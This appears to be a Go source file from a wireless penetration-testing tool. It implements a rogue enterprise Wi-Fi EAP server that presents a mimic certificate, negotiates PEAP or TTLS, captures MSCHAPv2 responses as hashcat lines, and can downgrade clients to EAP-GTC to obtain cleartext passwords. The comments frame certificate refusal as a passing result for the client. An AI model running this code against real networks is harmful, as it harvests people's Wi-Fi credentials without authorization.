package method

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"errors"
	"fmt"
	"sync"
	"time"
)

// Session timing.
const (
	// tlsRoundTimeout bounds one TLS exchange.
	tlsRoundTimeout = 5 * time.Second
	// SessionTimeout is how long a half-finished authentication is held.
	SessionTimeout = 60 * time.Second
)

// State is where an authentication has reached.
type State string

// Session states.
const (
	StateStart          State = "start"
	StateIdentity       State = "identity"
	StateTLSHandshake   State = "tls-handshake"
	StateInnerIdentity  State = "inner-identity"
	StateInnerChallenge State = "inner-challenge"
	StateTTLSPhase2     State = "ttls-phase2"
	StateCaptured       State = "captured"
	StateRejected       State = "rejected"
	StateFailed         State = "failed"
)

// Outcome records what happened in one authentication attempt.
//
// Every outcome is reportable, including the negative ones. A supplicant that refuses the
// mimic, or that Naks every method we offer, is correctly configured - that is a pass, and
// the report needs it as much as it needs a captured credential.
type Outcome struct {
	// OuterIdentity is the name sent in the clear, outside the tunnel.
	OuterIdentity string `json:"outer_identity,omitempty"`
	// InnerIdentity is the name sent inside the tunnel.
	//
	// Kept separate from the outer one on purpose: a supplicant that sends "anonymous"
	// outside and the real account inside is using identity privacy, and the difference is
	// itself worth reporting.
	InnerIdentity string `json:"inner_identity,omitempty"`

	// Method finally negotiated.
	Method Type `json:"method,omitempty"`
	// Offered lists the methods the supplicant said it would accept, from its Nak.
	Offered []Type `json:"offered,omitempty"`

	// Credential is the captured MSCHAPv2 exchange, if any.
	Credential *Credential `json:"-"`
	// HashLine is the hashcat -m 5500 line, ready for the cracking rig.
	HashLine string `json:"hash_line,omitempty"`
	// Cleartext holds a password recovered without any cracking step, from TTLS-PAP or GTC.
	Cleartext string `json:"cleartext,omitempty"`

	State State  `json:"state"`
	Note  string `json:"note,omitempty"`
	// TLSError records a supplicant that refused the certificate. This is a PASS.
	TLSError string `json:"tls_error,omitempty"`
}

// CertificateRejected reports whether the supplicant refused our certificate.
//
// That is the good outcome for the client: it means the supplicant validates the server chain
// and cannot be induced to hand over credentials to an impostor.
func (o Outcome) CertificateRejected() bool { return o.TLSError != "" }

// ServerConfig configures the EAP server.
type ServerConfig struct {
	// TLS is the mimic certificate to present.
	TLS *tls.Config
	// ESSID this server is impersonating, recorded on every outcome.
	ESSID string
	// AllowGTCDowngrade offers EAP-GTC when the supplicant Naks.
	//
	// GTC yields a cleartext password with no cracking step at all, so a supplicant that
	// accepts it is a much more serious finding than one that only does MSCHAPv2.
	AllowGTCDowngrade bool
	// Accept returns Access-Accept after capture instead of the default Access-Reject.
	//
	// Off by default. Rejecting means the supplicant sees a failed login and is not placed on
	// a network it should not be on; accepting is for hostile-portal work and is a deliberate
	// choice.
	Accept bool
	// MaxFragment bounds each EAP-TLS fragment.
	MaxFragment int
}

// Session is one supplicant's authentication attempt.
type Session struct {
	ID    string
	State State

	tlsSession *TLSSession
	frag       *Fragmenter
	cfg        ServerConfig

	outcome Outcome

	// authChallenge is the MSCHAPv2 challenge WARP issued, needed to derive the hashcat
	// challenge when the response arrives.
	authChallenge [AuthenticatorChallengeLen]byte
	innerID       uint8

	lastSeen time.Time
	mu       sync.Mutex
}

// Server runs EAP authentications against supplicants.
//
// It is the whole of WARP's enterprise logic. hostapd handles beaconing, association and
// EAPOL and relays every EAP message here untouched - so certificate presentation, method
// negotiation, credential capture and downgrade all live in Go, and there is no patched C
// anywhere in the tool.
type Server struct {
	cfg ServerConfig

	mu       sync.Mutex
	sessions map[string]*Session
}

// NewServer builds an EAP server.
func NewServer(cfg ServerConfig) (*Server, error) {
	if cfg.TLS == nil || len(cfg.TLS.Certificates) == 0 {
		return nil, errors.New("method: EAP server needs a certificate to present")
	}
	if cfg.MaxFragment <= 0 {
		cfg.MaxFragment = DefaultMaxFragment
	}
	return &Server{cfg: cfg, sessions: make(map[string]*Session)}, nil
}

// Result is what the RADIUS layer should do next.
type Result struct {
	// Packet is the EAP packet to send back, if any.
	Packet *Packet
	// Done means the exchange has reached a terminal state.
	Done bool
	// Accept means send Access-Accept rather than Access-Reject.
	Accept bool
	// Outcome is the recorded result, valid once Done.
	Outcome Outcome
}

// Handle advances a session with one inbound EAP packet.
func (s *Server) Handle(sessionID string, in *Packet) (Result, error) {
	if in == nil {
		return Result{}, errors.New("method: no EAP packet")
	}

	s.mu.Lock()
	sess, ok := s.sessions[sessionID]
	if !ok {
		sess = &Session{
			ID:    sessionID,
			State: StateStart,
			frag:  NewFragmenter(s.cfg.MaxFragment),
			cfg:   s.cfg,
		}
		sess.outcome.State = StateStart
		s.sessions[sessionID] = sess
	}
	s.mu.Unlock()

	sess.mu.Lock()
	defer sess.mu.Unlock()
	sess.lastSeen = time.Now()

	res, err := sess.handle(in)
	if res.Done {
		s.mu.Lock()
		delete(s.sessions, sessionID)
		s.mu.Unlock()
		if sess.tlsSession != nil {
			sess.tlsSession.Close()
		}
	}
	return res, err
}

// handle advances one session.
func (sess *Session) handle(in *Packet) (Result, error) {
	if in.Code != CodeResponse {
		return Result{}, fmt.Errorf("method: expected an EAP Response, got code %d", in.Code)
	}

	switch in.Type {
	case TypeIdentity:
		return sess.onIdentity(in)

	case TypeNak:
		return sess.onNak(in)

	case TypePEAP, TypeTTLS, TypeTLS:
		return sess.onTLSMethod(in)

	case TypeGTC:
		return sess.onGTC(in)

	default:
		// A method we did not offer. Record it and reject: guessing at an unknown method
		// would produce garbage rather than a finding.
		sess.outcome.Note = fmt.Sprintf("supplicant responded with unsupported method %s", in.Type)
		return sess.reject(in.Identifier, StateFailed)
	}
}

// onIdentity captures the outer identity and starts PEAP.
func (sess *Session) onIdentity(in *Packet) (Result, error) {
	sess.outcome.OuterIdentity = string(in.Data)
	sess.State = StateIdentity
	sess.outcome.State = StateIdentity

	// Begin PEAP. The Start flag with no data tells the supplicant to send its ClientHello.
	start := BuildTLSMessage(FlagStart|PEAPVersion0, 0, nil)
	sess.State = StateTLSHandshake
	sess.outcome.Method = TypePEAP

	return Result{Packet: Request(in.Identifier+1, TypePEAP, start)}, nil
}

// onNak records the methods a supplicant will accept and picks one.
//
// The Nak is the most informative packet in the exchange: it enumerates exactly what the
// supplicant is configured for, which is a finding whether or not anything is captured.
func (sess *Session) onNak(in *Packet) (Result, error) {
	offered := NakTypes(in)
	sess.outcome.Offered = offered

	for _, t := range offered {
		switch t {
		case TypePEAP:
			sess.outcome.Method = TypePEAP
			sess.State = StateTLSHandshake
			return Result{Packet: Request(in.Identifier+1, TypePEAP,
				BuildTLSMessage(FlagStart|PEAPVersion0, 0, nil))}, nil

		case TypeTTLS:
			sess.outcome.Method = TypeTTLS
			sess.State = StateTLSHandshake
			return Result{Packet: Request(in.Identifier+1, TypeTTLS,
				BuildTLSMessage(FlagStart, 0, nil))}, nil

		case TypeGTC:
			if !sess.cfg.AllowGTCDowngrade {
				continue
			}
			// GTC returns the password in cleartext with no cracking step. A supplicant that
			// accepts it outside a tunnel is a materially worse finding than one that only
			// does MSCHAPv2.
			sess.outcome.Method = TypeGTC
			sess.State = StateInnerChallenge
			return Result{Packet: Request(in.Identifier+1, TypeGTC, []byte("Password: "))}, nil
		}
	}

	sess.outcome.Note = fmt.Sprintf(
		"supplicant offered only %v, none of which this server accepts - its method "+
			"configuration is restrictive, which is a pass", offered)
	return sess.reject(in.Identifier, StateRejected)
}

// onTLSMethod drives the tunnel handshake and then the inner conversation.
func (sess *Session) onTLSMethod(in *Packet) (Result, error) {
	msg, err := ParseTLSMessage(in.Data)
	if err != nil {
		return Result{}, err
	}

	version := msg.Version()

	// Reassemble fragments. An acknowledgment carries no TLS bytes and must not reach the
	// TLS state machine.
	var payload []byte
	if !msg.IsACK() {
		var complete bool
		payload, complete = sess.frag.Accept(msg)
		if !complete {
			// Acknowledge and wait for the rest.
			return Result{Packet: Request(in.Identifier+1, in.Type, ACK(version))}, nil
		}
	}

	// Still sending our own fragments: the ACK asks for the next one.
	if sess.frag.Pending() {
		return Result{Packet: Request(in.Identifier+1, in.Type, sess.frag.Next(version))}, nil
	}

	if sess.tlsSession == nil {
		sess.tlsSession = NewTLSServer(sess.cfg.TLS)
	}

	if !sess.tlsSession.HandshakeComplete() {
		out, err := sess.tlsSession.Exchange(payload, tlsRoundTimeout)
		if err != nil && !sess.tlsSession.HandshakeComplete() {
			// A supplicant that refuses the certificate lands here. That is a PASS for the
			// client and is recorded as one, not as a tool failure.
			if terr := sess.tlsSession.HandshakeError(); terr != nil {
				sess.outcome.TLSError = terr.Error()
				sess.outcome.Note = "supplicant rejected the presented certificate - it validates " +
					"the server chain correctly, which is a PASS"
				// Any alert bytes TLS produced are still worth sending: they are what appears
				// in the supplicant's own logs.
				if len(out) > 0 {
					sess.frag.Queue(out)
					return Result{Packet: Request(in.Identifier+1, in.Type, sess.frag.Next(version))}, nil
				}
				return sess.reject(in.Identifier, StateRejected)
			}
			return Result{}, err
		}

		if len(out) > 0 {
			sess.frag.Queue(out)
			return Result{Packet: Request(in.Identifier+1, in.Type, sess.frag.Next(version))}, nil
		}

		if sess.tlsSession.HandshakeComplete() {
			return sess.beginPhase2(in, version)
		}
		return Result{Packet: Request(in.Identifier+1, in.Type, ACK(version))}, nil
	}

	// The handshake is complete. In the normal full handshake, our ChangeCipherSpec+Finished was
	// the last flight we sent - produced as output bytes in the round above, which returned before
	// startInner could run - and the supplicant answers it with an empty EAP-Response/PEAP that
	// acknowledges it. That ACK is *this* packet: Phase 2 has not been opened yet (the state is
	// still the handshake), so send the first inner EAP request now rather than mistaking the ACK
	// for inner application data, which is what left the exchange stalled with the tunnel up and no
	// error anywhere. Once startInner runs the state advances and every later packet is inner EAP.
	if sess.State == StateTLSHandshake {
		return sess.beginPhase2(in, version)
	}

	// The tunnel is up. PEAP tunnels inner EAP; TTLS tunnels Diameter AVPs.
	if sess.State == StateTTLSPhase2 {
		return sess.ttlsPhase2(in, version, payload)
	}
	return sess.innerExchange(in, version, payload)
}

// beginPhase2 opens the tunnelled conversation once the TLS handshake is complete, choosing the
// Phase-2 style by the negotiated method: TTLS carries Diameter AVPs, everything else (PEAP) carries
// inner EAP.
func (sess *Session) beginPhase2(in *Packet, version uint8) (Result, error) {
	if sess.outcome.Method == TypeTTLS {
		return sess.startTTLSPhase2(in, version)
	}
	return sess.startInner(in, version)
}

// startInner sends the first inner request once the tunnel is established.
func (sess *Session) startInner(in *Packet, version uint8) (Result, error) {
	sess.State = StateInnerIdentity
	sess.innerID = in.Identifier + 1

	inner := marshalInner(&Packet{
		Code: CodeRequest, Identifier: sess.innerID, Type: TypeIdentity,
	})
	records, err := sess.tlsSession.WriteApplication(inner, tlsRoundTimeout)
	if err != nil {
		return Result{}, err
	}

	sess.frag.Queue(records)
	return Result{Packet: Request(in.Identifier+1, in.Type, sess.frag.Next(version))}, nil
}

// innerExchange handles one round of the tunnelled EAP conversation.
func (sess *Session) innerExchange(in *Packet, version uint8, payload []byte) (Result, error) {
	plain, err := sess.tlsSession.ReadApplication(payload, tlsRoundTimeout)
	if err != nil {
		return Result{}, err
	}
	if len(plain) == 0 {
		return Result{Packet: Request(in.Identifier+1, in.Type, ACK(version))}, nil
	}

	innerPkt, err := unmarshalInner(plain)
	if err != nil {
		return Result{}, err
	}

	switch sess.State {
	case StateInnerIdentity:
		if innerPkt.Type != TypeIdentity {
			// The supplicant skipped straight to a method; fall through and treat it as the
			// challenge round.
			break
		}
		sess.outcome.InnerIdentity = string(innerPkt.Data)
		sess.State = StateInnerChallenge

		// Issue the MSCHAPv2 challenge.
		if _, err := rand.Read(sess.authChallenge[:]); err != nil {
			return Result{}, fmt.Errorf("method: generate MSCHAPv2 challenge: %w", err)
		}
		sess.innerID++
		challenge := BuildChallenge(sess.innerID, sess.authChallenge, "warp")

		inner := marshalInner(&Packet{
			Code: CodeRequest, Identifier: sess.innerID, Type: TypeMSCHAPv2, Data: challenge,
		})
		records, err := sess.tlsSession.WriteApplication(inner, tlsRoundTimeout)
		if err != nil {
			return Result{}, err
		}
		sess.frag.Queue(records)
		return Result{Packet: Request(in.Identifier+1, in.Type, sess.frag.Next(version))}, nil
	}

	// The credential round.
	if innerPkt.Type == TypeMSCHAPv2 && len(innerPkt.Data) > 0 && innerPkt.Data[0] == OpResponse {
		cred, err := ParseResponse(innerPkt.Data[1:])
		if err != nil {
			return Result{}, err
		}
		cred.AuthenticatorChallenge = sess.authChallenge

		if cred.Username == "" {
			cred.Username = sess.outcome.InnerIdentity
		}
		sess.outcome.Credential = &cred
		if line, err := cred.HashcatLine(); err == nil {
			sess.outcome.HashLine = line
		} else {
			sess.outcome.Note = "credential captured but not emittable: " + err.Error()
		}
		sess.outcome.Method = TypeMSCHAPv2
		return sess.finish(in.Identifier, StateCaptured)
	}

	if innerPkt.Type == TypeGTC {
		// GTC inside the tunnel: the password arrives in cleartext with no cracking step.
		sess.outcome.Cleartext = string(innerPkt.Data)
		sess.outcome.Method = TypeGTC
		return sess.finish(in.Identifier, StateCaptured)
	}

	if innerPkt.Type == TypeNak {
		sess.outcome.Offered = NakTypes(innerPkt)
		sess.outcome.Note = "supplicant refused the inner method"
		return sess.reject(in.Identifier, StateRejected)
	}

	sess.outcome.Note = fmt.Sprintf("unexpected inner method %s (state=%s plain=%x)", innerPkt.Type, sess.State, plain)
	return sess.reject(in.Identifier, StateFailed)
}

// onGTC handles a bare (untunnelled) GTC response.
func (sess *Session) onGTC(in *Packet) (Result, error) {
	sess.outcome.Cleartext = string(in.Data)
	sess.outcome.Method = TypeGTC
	sess.outcome.Note = "password captured in cleartext via EAP-GTC with no tunnel; the " +
		"supplicant accepted a plaintext method from an unauthenticated server"
	return sess.finish(in.Identifier, StateCaptured)
}

// finish concludes an authentication.
func (sess *Session) finish(id uint8, state State) (Result, error) {
	sess.State = state
	sess.outcome.State = state

	// Access-Reject is the default: the supplicant sees a failed login and is not placed on a
	// network it should not be on. Accepting is a deliberate opt-in for hostile-portal work.
	if sess.cfg.Accept {
		return Result{
			Packet:  Success(id),
			Done:    true,
			Accept:  true,
			Outcome: sess.outcome,
		}, nil
	}
	return Result{Packet: Failure(id), Done: true, Outcome: sess.outcome}, nil
}

func (sess *Session) reject(id uint8, state State) (Result, error) {
	sess.State = state
	sess.outcome.State = state
	return Result{Packet: Failure(id), Done: true, Outcome: sess.outcome}, nil
}

// Expire drops sessions that have gone quiet, returning how many were removed.
func (s *Server) Expire(now time.Time) int {
	s.mu.Lock()
	defer s.mu.Unlock()

	n := 0
	for id, sess := range s.sessions {
		sess.mu.Lock()
		stale := now.Sub(sess.lastSeen) > SessionTimeout
		sess.mu.Unlock()

		if stale {
			if sess.tlsSession != nil {
				sess.tlsSession.Close()
			}
			delete(s.sessions, id)
			n++
		}
	}
	return n
}

// Active returns the number of authentications in flight.
func (s *Server) Active() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.sessions)
}

// ---------------------------------------------------------------------------
// PEAPv0 inner EAP framing
// ---------------------------------------------------------------------------

// marshalInner encodes an inner EAP packet for the PEAPv0 tunnel.
//
// PEAPv0 carries only the Type and Type-Data inside the tunnel: the Code and Identifier come from
// the outer PEAP EAP-Request/Response that carries the TLS record, and the Length is implied by the
// record boundary. Sending the full four-byte EAP header (or even Code+Identifier+Type) inside the
// tunnel shifts every field along, so the supplicant reads the wrong Type - the identity round can
// survive it by luck, because EAP Code Request (1) equals EAP Type Identity (1), but the MSCHAPv2
// round never does, and the symptom is an authentication that stalls after the tunnel comes up with
// no error anywhere. Confirmed on the wire against wpa_supplicant: it sends its inner
// EAP-Response/Identity as exactly [Type][identity] with no Code, Identifier or Length.
//
// The outer EAP identifier still has to advance every round; that is the caller's job when it wraps
// this in Request(id, TypePEAP, ...). The Identifier field on p is not sent here.
func marshalInner(p *Packet) []byte {
	return append([]byte{byte(p.Type)}, p.Data...)
}

// unmarshalInner decodes an inner EAP packet from the PEAPv0 tunnel: [Type][Type-Data].
//
// A minority of supplicants send a full inner EAP header (Code, Identifier, Length, Type) instead.
// That shape is accepted as a fallback, distinguished by a Length field that matches the buffer and
// a leading byte that is a valid EAP Code - but the bare PEAPv0 form is what wpa_supplicant and the
// estate's clients actually send, so it is tried first.
func unmarshalInner(b []byte) (*Packet, error) {
	if len(b) < 1 {
		return nil, errors.New("method: inner EAP packet is empty")
	}

	// Full-header form: code, id, length(2), type. Only when the length field agrees with the
	// buffer *and* the leading byte is a real EAP Code - otherwise a bare [Type][Data] packet whose
	// Type happens to equal a Code value (Identity is 1, Request is 1) would be misread.
	if len(b) >= 5 && (b[0] == CodeRequest || b[0] == CodeResponse) {
		if l := int(binary.BigEndian.Uint16(b[2:4])); l == len(b) {
			return &Packet{Code: b[0], Identifier: b[1], Type: Type(b[4]), Data: b[5:]}, nil
		}
	}

	// Bare PEAPv0 form: type, type-data. Code and Identifier are inherited from the outer packet.
	return &Packet{Type: Type(b[0]), Data: b[1:]}, nil
}
